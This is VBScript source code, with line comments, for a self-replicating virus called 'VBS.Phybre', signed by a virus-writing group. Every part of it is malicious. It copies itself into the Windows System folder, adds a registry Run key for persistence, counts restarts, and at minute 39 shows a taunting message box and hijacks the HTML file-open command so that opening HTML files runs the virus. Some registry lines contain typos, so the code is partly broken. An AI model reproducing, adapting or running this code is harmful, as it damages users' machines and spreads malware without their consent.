On Error Resume Next  ' - Continue on error
Set fso = CreateObject("Scripting.FileSystemObject")  ' - Define fso
Set Reg = CreateObject("WScript.Shell")  ' - Define Reg
Const SystemFolder = 1, ForReading = 1, ForWriting = 2, ForAppending = 8  ' - Set constants
'-----
Dim Parent, ReadIt, Destination, Mirror, FileInfo, Check, Loaded  ' - Define variables
Parent = WScript.ScriptFullName  ' - Get the FULL path and filename of the script
Set Destination = fso.GetSpecialFolder(SystemFolder)  ' - Define Destination as the Windows\System dir
FileInfo = Destination & "\VBS.Phybre.vbs"  ' - Define the filename
If (fso.FileExists(FileInfo)) Then  ' - If the file exists already then
Set Check = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Phybre")  ' - Read the registry entry
If Check = FileInfo Then  ' - If the result of above matches the filename then do nothing
Else
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Phybre", FileInfo  ' - Re-write the registry entry
End If

Else  ' - If the file does not exist
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Phybre\Runs", "1"  ' - Write the amount of runs to the registry
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Phybre", FileInfo  ' - Make the code run at startup
Set ReadMe = fso.OpenTextFile(Parent, ForReading)  ' - Open the code
ReadIt = ReadMe.ReadAll  ' - Read all contents
ReadMe.Close  ' - Close the code
Set Mirror = fso.CreateTextFile(FileInfo, True)  ' - Create a file in Windows\System
Mirror.Write ReadIt  ' - Write code to it
Mirror.Close  ' - Close new file
End If

Mins = Minute(Now)  ' - Get the minutes from the time

If Mins = "39" Then  ' - If the minutes = 39 then
Loaded = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Phybre\Runs")  ' - Read the amount of runs from registry
MsgBox "Tick Tick... " & (Chr(13) & Chr(10)) & "I Have Sat On Your System For " & Loaded & " Restarts Before Making Myself Known To You" & (Chr(13) & Chr(10)) & (Chr(13) & Chr(10)) & "VBS.Phybre"  & (Chr(13) & Chr(10)) & "Coded by Ruzz`" & (Chr(13) & Chr(10)) & "The Shadow Virus Group" & (Chr(13) & Chr(10)) & "http://www.virusexchange.org/shadowvx", 4096, "VBS.Phybre"  ' - Display a messagebox
Reg.RegWrite "HKEY_CLASSES_ROOT\htmlfile\shell\open\command\(Default)", "c:\windows\system\Phybre.vbs"  ' - Make all HTML files run the code
Else  ' - If the minutes are not 39
Loaded = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Phybre\Runs")  ' - Read the amount of runs from the registry
Loaded = Loaded + 1  ' - Add one to it
Reg.RegWrite "HKEY_LOCAL_MACHICE\Software\Microsoft\Windows\CurrentVersion\Phybre\Runs", Loaded  ' - Re-write the amount of runs to the registry
End If

